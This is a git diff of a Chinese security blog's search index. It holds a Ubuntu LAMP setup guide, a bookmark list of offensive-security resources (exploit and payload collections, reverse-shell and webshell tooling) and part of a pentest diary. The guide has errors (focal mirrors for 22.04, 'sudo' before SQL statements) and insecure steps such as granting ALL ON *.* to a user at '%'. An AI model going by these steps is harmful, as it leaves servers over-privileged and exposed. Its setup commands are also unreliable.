-<h1 id="5-将PHP与Apache2和MySQL关联"><a href="#5-将PHP与Apache2和MySQL关联" class="headerlink" title="5. 将PHP与Apache2和MySQL关联"></a>5. 将PHP与Apache2和MySQL关联</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 与 Apache2 关联</span></span><br><span class="line">$ sudo apt-get install libapache2-mod-php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 与 MySQL 关联</span></span><br><span class="line">$ sudo apt-get install php-mysql</span><br></pre></td></tr></table></figure>
-
-<h1 id="6-修改Apache2配置文件"><a href="#6-修改Apache2配置文件" class="headerlink" title="6. 修改Apache2配置文件"></a>6. 修改Apache2配置文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步 打开Apache2配置文件(不熟悉vim操作的情况下, 可以先查一下vim的基础用法)</span></span><br><span class="line">sudo vim /etc/apache2/mods-available/phpX.X.conf  </span><br><span class="line"><span class="comment"># 注意, 这里的X代表的是php的版本号, 在不知道版本号的情况下, 可以在 </span></span><br><span class="line"><span class="comment"># 输入 /etc/apache2/mods-available/php 的时候, 连续按两次tab键, 就可以显示出是什么版本的php.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步 修改配置文件</span></span><br><span class="line"><span class="comment"># 如果第一行的内容是(没有的话就不管了)</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(ar|p|tml)|html$&quot;</span>&gt;</span><br><span class="line"><span class="comment"># 则将其改成</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(ar|p|tml)|htm|html$&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步 重启Apache2</span></span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
-
-<h1 id="7-测试环境是否搭建成功"><a href="#7-测试环境是否搭建成功" class="headerlink" title="7. 测试环境是否搭建成功"></a>7. 测试环境是否搭建成功</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 切换到 html 目录下</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"></span><br><span class="line">创建两个测试用的文件</span><br><span class="line">vim test.php</span><br><span class="line">vim test.html</span><br></pre></td></tr></table></figure>
-
-<p>这两个测试文件都写入如下内容</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>保存之后, 通过浏览器访问 <code>http://&lt;your_ip&gt;/index.php</code> 如果看到phpinfo界面，则说明php环境正常。<br>通过浏览器访问 <code>http://&lt;your_ip&gt;/index.html</code> 如果看到phpinfo界面，则说明LAMP环境正常。</p>
-<h1 id="附-一些常用命令"><a href="#附-一些常用命令" class="headerlink" title="附: 一些常用命令"></a>附: 一些常用命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Apache相关</span></span><br><span class="line">sudo apache2 start      <span class="comment"># 开启 Apache2</span></span><br><span class="line">sudo apache2 stop       <span class="comment"># 关闭 Apache2</span></span><br><span class="line">sudo apache2 restart    <span class="comment"># 重启 Apache2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关</span></span><br><span class="line"></span><br><span class="line">进入数据库</span><br><span class="line">sudo mysql</span><br><span class="line">创建用户</span><br><span class="line">sudo CREATE USER <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"></span><br><span class="line">赋予用户对所有 表 增删改查的权利</span><br><span class="line">sudo GRANT ALL ON *.* TO <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">或</span><br><span class="line">sudo GRANT SELECT,DELETE,INSERT,UPDATE ON 数据库.* TO 用户名@<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">用户登录</span><br><span class="line">sudo mysql -u username -p <span class="comment"># 回车之后输入密码</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>Hello World</title>
@@ -415,106 +364,6 @@
 
 <h3 id="6-部署发布文章"><a href="#6-部署发布文章" class="headerlink" title="6. 部署发布文章"></a>6. 部署发布文章</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
 ]]></content>
-  </entry>
-  <entry>
-    <title>码一些网站（长期更新）</title>
-    <url>/2021/08/18/%E7%A0%81%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/</url>
-    <content><![CDATA[<blockquote>
-<p>记录已经学过的和未学过的知识点。（同时还收藏了一些莫名其妙的东西）<br>已完成的内容将会在地址前打勾<br>我，学，学不完了！</p>
-</blockquote>
-<h2 id="一、大师父们的博客"><a href="#一、大师父们的博客" class="headerlink" title="一、大师父们的博客"></a>一、大师父们的博客</h2><ol>
-<li><input disabled="" type="checkbox"> <a href="http://iamstudy.cnblogs.com/">http://iamstudy.cnblogs.com/</a> 柠檬师父的博客 </li>
-<li><input disabled="" type="checkbox"> <a href="https://cl0und.github.io/">https://cl0und.github.io/</a> 刘师父的博客 </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/">https://www.leavesongs.com/</a> 离别歌师父的博客 </li>
-<li><input disabled="" type="checkbox"> <a href="https://bl4ck.in/">https://bl4ck.in/</a> tomato师父的博客 </li>
-<li><input disabled="" type="checkbox"> <a href="https://godot.win/">https://godot.win/</a> Godot师父的博客 </li>
-<li><input disabled="" type="checkbox"> <a href="http://www.k0rz3n.com/">http://www.k0rz3n.com</a> K0rz3n师父的博客</li>
-<li><input disabled="" type="checkbox"> <a href="https://www.iloveflag.com/">https://www.iloveflag.com/</a> iloveflag!</li>
-<li><input disabled="" type="checkbox"> <a href="http://blog.orange.tw/">http://blog.orange.tw/</a> 橘子师父的博客（需要挂代理） </li>
-</ol>
-<p><strong>Ps：更多师父的博客可以通过友链互相跳转</strong> </p>
-<h2 id="二、Github上一些不错的项目"><a href="#二、Github上一些不错的项目" class="headerlink" title="二、Github上一些不错的项目"></a>二、Github上一些不错的项目</h2><h3 id="安全文章"><a href="#安全文章" class="headerlink" title="安全文章"></a>安全文章</h3><ol>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a> Web安全大合集</li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 从零开始的红队之路</li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> AD的攻击与防御</li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透Tips</li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections">https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections</a> APT和网络犯罪活动的收集</li>
-</ol>
-<h3 id="exp合集"><a href="#exp合集" class="headerlink" title="exp合集"></a>exp合集</h3><ol>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> linux-kernel-exploits Linux平台提权漏洞集合 </li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a> 超大的payload合集</li>
-</ol>
-<h3 id="靶场相关"><a href="#靶场相关" class="headerlink" title="靶场相关"></a>靶场相关</h3><ol>
-<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> phith0n师父的一个面向大众的开源漏洞靶场</li>
-<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> sqli-labs 经典的练习SQL注入的靶场 </li>
-<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a> DVWA 经典的基础漏洞的练习靶场</li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/wonderkun/CTF_web">https://github.com/wonderkun/CTF_web</a> 一个CTF的web项目</li>
-</ol>
-<h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><ol>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a> 超经典的SQL注入工具</li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> 脚本调用框架，用于渗透测试中 采集|爬虫|爆破|批量PoC 等需要并发的任务。 </li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/Hecbi/awd_auto_attack">https://github.com/Hecbi/awd_auto_attack</a> 一个自动化写入php不死马/进程守护马，批量获得flag的线下赛工具 </li>
-</ol>
-<h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><ol>
-<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/komeiji-satori/Dress">https://github.com/komeiji-satori/Dress</a> 女装项目 </li>
-<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/StylishThemes/GitHub-Dark">https://github.com/StylishThemes/GitHub-Dark</a> 黑暗风格的github</li>
-</ol>
-<h2 id="三、CTF相关"><a href="#三、CTF相关" class="headerlink" title="三、CTF相关"></a>三、CTF相关</h2><ol>
-<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/xss-collect.html">https://www.leavesongs.com/PENETRATION/xss-collect.html</a> XSS的一些绕过方法 </li>
-<li><input disabled="" type="checkbox"> <a href="https://blog.csdn.net/u011377996/article/details/80787236">https://blog.csdn.net/u011377996/article/details/80787236</a> 安恒杯6月wp </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/164569">https://www.anquanke.com/post/id/164569</a> LCTF wp </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.freebuf.com/articles/web/118149.html">https://www.freebuf.com/articles/web/118149.html</a> CTF搅屎指南 </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.codercto.com/a/41228.html?tdsourcetag=s_pctim_aiomsg">https://www.codercto.com/a/41228.html?tdsourcetag=s_pctim_aiomsg</a> NCTF部分题解</li>
-<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2308">https://xz.aliyun.com/t/2308</a> 用python继承链搞事情</li>
-<li><input disabled="" type="checkbox"> <a href="http://www.cnblogs.com/Vinson404/p/7253255.html">http://www.cnblogs.com/Vinson404/p/7253255.html</a> SQL注入绕过</li>
-<li><input disabled="" type="checkbox"> <a href="https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/">https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/</a> SOME攻击</li>
-<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/159206">https://www.anquanke.com/post/id/159206</a> 四个实例递进php反序列化漏洞理解  </li>
-</ol>
-<h3 id="关于SQL注入中的Unicode安全，顺序浏览"><a href="#关于SQL注入中的Unicode安全，顺序浏览" class="headerlink" title="关于SQL注入中的Unicode安全，顺序浏览"></a>关于SQL注入中的Unicode安全，顺序浏览</h3><ul>
-<li><input disabled="" type="checkbox"> <a href="https://skysec.top/2018/03/21/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%B7%B1%E5%85%A5mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E6%AF%94%E5%AF%B9%E6%96%B9%E6%B3%95collation/">从一道题深入mysql字符集与比对方法collation</a></li>
-<li><input disabled="" type="checkbox"> <a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html">Collation chart for utf8_general_ci</a> </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">Mysql字符编码利用技巧 </a></li>
-</ul>
-<h3 id="巧用LD-PRELOAD突破disable-functions"><a href="#巧用LD-PRELOAD突破disable-functions" class="headerlink" title="巧用LD_PRELOAD突破disable_functions"></a>巧用LD_PRELOAD突破disable_functions</h3><ul>
-<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/175403">1. 深入浅出LD_PRELOAD &amp; putenv()</a> </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.freebuf.com/articles/web/192052.html">2. 无需sendmail：巧用LD_PRELOAD突破disable_functions</a> </li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">3. bypass disable_functions via LD_PRELOAD</a> </li>
-<li><input disabled="" type="checkbox"> <a href="https://github.com/AntSwordProject/ant_php_extension">4. Ant PHP Extension</a> </li>
-</ul>
-<h3 id="fpm绕过disable-functions"><a href="#fpm绕过disable-functions" class="headerlink" title="fpm绕过disable_functions"></a>fpm绕过disable_functions</h3><ul>
-<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">1. Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a> </li>
-<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/5598">2. 浅析php-fpm的攻击方式</a></li>
-<li><input disabled="" type="checkbox"> <a href="https://evoa.me/index.php/archives/52/">3. PHP 连接方式&amp;攻击PHP-FPM&amp;*CTF echohub WP</a> </li>
-</ul>
-<h2 id="四、一些值得学习的好文章"><a href="#四、一些值得学习的好文章" class="headerlink" title="四、一些值得学习的好文章"></a>四、一些值得学习的好文章</h2><ol>
-<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/128">https://xz.aliyun.com/t/128</a> 浅析自动绑定漏洞</li>
-<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a> Linux 反弹shell（一）文件描述符与重定向</li>
-<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a> Linux 反弹shell（二）反弹shell的本质</li>
-<li><input disabled="" type="checkbox"> <a href="https://www.cnblogs.com/xiaozi/p/12963549.html">https://www.cnblogs.com/xiaozi/p/12963549.html</a> 绕过CDN查找真实IP</li>
-</ol>
-<h2 id="五、资料库"><a href="#五、资料库" class="headerlink" title="五、资料库"></a>五、资料库</h2><ol>
-<li><input disabled="" type="checkbox"> <a href="https://www.securityfocus.com/">https://www.securityfocus.com/</a> Bugtraq SecurityFocus </li>
-<li><input disabled="" type="checkbox"> <a href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a> Packet Storm</li>
-<li><input disabled="" type="checkbox"> <a href="https://www.seebug.org/">https://www.seebug.org/</a> Seebug</li>
-<li><input disabled="" type="checkbox"> <a href="http://www.anquan.us/">http://www.anquan.us/</a> 乌云镜像站 </li>
-<li><input disabled="" type="checkbox"> <a href="https://wizardforcel.gitbooks.io/web-hacking-101/content/">https://wizardforcel.gitbooks.io/web-hacking-101/content/</a> 实战案例</li>
-<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2231">https://xz.aliyun.com/t/2231</a> 安全帮－零基础web安全学习终极攻略</li>
-<li><input disabled="" type="checkbox"> <a href="https://portswigger.net/web-security/dashboard">https://portswigger.net/web-security/dashboard</a>  burp学院，最适合新手入门的指导资料</li>
-</ol>
-<h2 id="六、杂"><a href="#六、杂" class="headerlink" title="六、杂"></a>六、杂</h2><ol>
-<li><input checked="" disabled="" type="checkbox"> <a href="https://blog.coding.net/blog/CS-Hexo">https://blog.coding.net/blog/CS-Hexo</a> Hexo搭建博客 </li>
-<li><input disabled="" type="checkbox"> <a href="https://50-jahre-hitparade.ch/">https://50-jahre-hitparade.ch/</a> 好玩的网站 </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.cnblogs.com/zhangziqiang/p/7478075.html">https://www.cnblogs.com/zhangziqiang/p/7478075.html</a> Linux Shell常用shell命令 </li>
-<li><input disabled="" type="checkbox"> <a href="http://tour.ubuntu.com/zh-CN/#surf-the-web">http://tour.ubuntu.com/zh-CN/#surf-the-web</a> 在线ubuntu虚拟机 </li>
-<li><input disabled="" type="checkbox"> <a href="https://www.jianshu.com/p/444883157618">https://www.jianshu.com/p/444883157618</a> java两天速成</li>
-</ol>
-]]></content>
-      <categories>
-        <category>学习资源</category>
-      </categories>
-      <tags>
-        <tag>学习资源</tag>
-      </tags>
   </entry>
   <entry>
     <title>图片隐写简记</title>
@@ -623,6 +472,39 @@
 <li>gif图片处理——<a href="https://ezgif.com/split">https://ezgif.com/split</a></li>
 </ol>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu22.04搭建LAMP环境</title>
+    <url>/2023/09/21/Ubuntu22-04%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<blockquote>
+<p>LAMP 环境即 （Linux + Apache + Mysql + PHP）集成环境</p>
+</blockquote>
+<h1 id="1-更新源"><a href="#1-更新源" class="headerlink" title="1. 更新源"></a>1. 更新源</h1><p>首先更新 Ubuntu22.04 中的所有东西</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 备份</span></span><br><span class="line">sudo <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 换源</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用vim修改配置内容如下（原有内容直接添加 #(井号) 进行注释）</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse </span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse </span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 更新源</span></span><br><span class="line">sudo apt-get update </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 更新软件</span></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 更新系统软件 </span></span><br><span class="line">sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-安装Apache2"><a href="#2-安装Apache2" class="headerlink" title="2. 安装Apache2"></a>2. 安装Apache2</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装</span></span><br><span class="line">sudo apt install apache2 -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检查 Apache2 是否开启</span></span><br><span class="line">systemctl status apache2</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-安装MySQL"><a href="#3-安装MySQL" class="headerlink" title="3. 安装MySQL"></a>3. 安装MySQL</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装</span></span><br><span class="line">sudo apt install mysql-server mysql-client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看MySQL是否安装成功</span></span><br><span class="line">sudo mysql</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-安装PHP"><a href="#4-安装PHP" class="headerlink" title="4. 安装PHP"></a>4. 安装PHP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 PHP</span></span><br><span class="line">sudo apt-get install php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看PHP是否安装成功</span></span><br><span class="line">sudo php -v</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-将PHP与Apache2和MySQL关联"><a href="#5-将PHP与Apache2和MySQL关联" class="headerlink" title="5. 将PHP与Apache2和MySQL关联"></a>5. 将PHP与Apache2和MySQL关联</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 与 Apache2 关联</span></span><br><span class="line">$ sudo apt-get install libapache2-mod-php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 与 MySQL 关联</span></span><br><span class="line">$ sudo apt-get install php-mysql</span><br></pre></td></tr></table></figure>
+
+<h1 id="6-修改Apache2配置文件"><a href="#6-修改Apache2配置文件" class="headerlink" title="6. 修改Apache2配置文件"></a>6. 修改Apache2配置文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步 打开Apache2配置文件(不熟悉vim操作的情况下, 可以先查一下vim的基础用法)</span></span><br><span class="line">sudo vim /etc/apache2/mods-available/phpX.X.conf  </span><br><span class="line"><span class="comment"># 注意, 这里的X代表的是php的版本号, 在不知道版本号的情况下, 可以在 </span></span><br><span class="line"><span class="comment"># 输入 /etc/apache2/mods-available/php 的时候, 连续按两次tab键, 就可以显示出是什么版本的php.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步 修改配置文件</span></span><br><span class="line"><span class="comment"># 如果第一行的内容是(没有的话就不管了)</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(ar|p|tml)|html$&quot;</span>&gt;</span><br><span class="line"><span class="comment"># 则将其改成</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(ar|p|tml)|htm|html$&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步 重启Apache2</span></span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
+
+<h1 id="7-测试环境是否搭建成功"><a href="#7-测试环境是否搭建成功" class="headerlink" title="7. 测试环境是否搭建成功"></a>7. 测试环境是否搭建成功</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 切换到 html 目录下</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"></span><br><span class="line">创建两个测试用的文件</span><br><span class="line">vim test.php</span><br><span class="line">vim test.html</span><br></pre></td></tr></table></figure>
+
+<p>这两个测试文件都写入如下内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>保存之后, 通过浏览器访问 <code>http://&lt;your_ip&gt;/index.php</code> 如果看到phpinfo界面，则说明php环境正常。<br>通过浏览器访问 <code>http://&lt;your_ip&gt;/index.html</code> 如果看到phpinfo界面，则说明LAMP环境正常。</p>
+<h1 id="附-一些常用命令"><a href="#附-一些常用命令" class="headerlink" title="附: 一些常用命令"></a>附: 一些常用命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Apache相关</span></span><br><span class="line">sudo apache2 start      <span class="comment"># 开启 Apache2</span></span><br><span class="line">sudo apache2 stop       <span class="comment"># 关闭 Apache2</span></span><br><span class="line">sudo apache2 restart    <span class="comment"># 重启 Apache2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关</span></span><br><span class="line"></span><br><span class="line">进入数据库</span><br><span class="line">sudo mysql</span><br><span class="line">创建用户</span><br><span class="line">sudo CREATE USER <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"></span><br><span class="line">赋予用户对所有 表 增删改查的权利</span><br><span class="line">sudo GRANT ALL ON *.* TO <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">或</span><br><span class="line">sudo GRANT SELECT,DELETE,INSERT,UPDATE ON 数据库.* TO 用户名@<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">用户登录</span><br><span class="line">sudo mysql -u username -p <span class="comment"># 回车之后输入密码</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>第一次参与渗透测试项目</title>
@@ -676,6 +558,103 @@
 
 
 <h2 id="一些感受"><a href="#一些感受" class="headerlink" title="一些感受"></a>一些感受</h2><p>整个项目做下来，最大的感受就是操作的重复性和漏洞的单一性。这种时间紧迫的情况下，很难看到使用奇淫技巧进行渗透的方式。往往就是拿到目标数据或者目标权限就直接撤退。而我作为一个新人，跟在大佬后面。能够起的作用也只有机械化的验证漏洞是否存在。<br>在这种大型的单位里面，外网层的漏洞少得可怜。但是，一旦接入内网，简直就是满目疮痍。弱口令，未授权，RCE，应有尽有。这些单位几乎将所有精力都放在了web层的防护上，而忽略了内网的重要性。也有一部分原因是因为内网的复杂性远远高于外网。单位技术人员并不能照顾到内网的每个细节。所以在扫描器这种机械化的工具之下，这些细小的失误就展露无余。<br>半个多月过去了，其实感觉自己并没有学到什么实质性的东西。只是体验了一下”工业化渗透”的过程。除了累和乏味，没有什么其他感受了。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>码一些网站（长期更新）</title>
+    <url>/2021/08/18/%E7%A0%81%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/</url>
+    <content><![CDATA[<blockquote>
+<p>记录已经学过的和未学过的知识点。（同时还收藏了一些莫名其妙的东西）<br>已完成的内容将会在地址前打勾<br>我，学，学不完了！</p>
+</blockquote>
+<h2 id="一、大师父们的博客"><a href="#一、大师父们的博客" class="headerlink" title="一、大师父们的博客"></a>一、大师父们的博客</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="http://iamstudy.cnblogs.com/">http://iamstudy.cnblogs.com/</a> 柠檬师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://cl0und.github.io/">https://cl0und.github.io/</a> 刘师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/">https://www.leavesongs.com/</a> 离别歌师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://bl4ck.in/">https://bl4ck.in/</a> tomato师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://godot.win/">https://godot.win/</a> Godot师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="http://www.k0rz3n.com/">http://www.k0rz3n.com</a> K0rz3n师父的博客</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.iloveflag.com/">https://www.iloveflag.com/</a> iloveflag!</li>
+<li><input disabled="" type="checkbox"> <a href="http://blog.orange.tw/">http://blog.orange.tw/</a> 橘子师父的博客（需要挂代理） </li>
+</ol>
+<p><strong>Ps：更多师父的博客可以通过友链互相跳转</strong> </p>
+<h2 id="二、Github上一些不错的项目"><a href="#二、Github上一些不错的项目" class="headerlink" title="二、Github上一些不错的项目"></a>二、Github上一些不错的项目</h2><h3 id="安全文章"><a href="#安全文章" class="headerlink" title="安全文章"></a>安全文章</h3><ol>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a> Web安全大合集</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 从零开始的红队之路</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> AD的攻击与防御</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透Tips</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections">https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections</a> APT和网络犯罪活动的收集</li>
+</ol>
+<h3 id="exp合集"><a href="#exp合集" class="headerlink" title="exp合集"></a>exp合集</h3><ol>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> linux-kernel-exploits Linux平台提权漏洞集合 </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a> 超大的payload合集</li>
+</ol>
+<h3 id="靶场相关"><a href="#靶场相关" class="headerlink" title="靶场相关"></a>靶场相关</h3><ol>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> phith0n师父的一个面向大众的开源漏洞靶场</li>
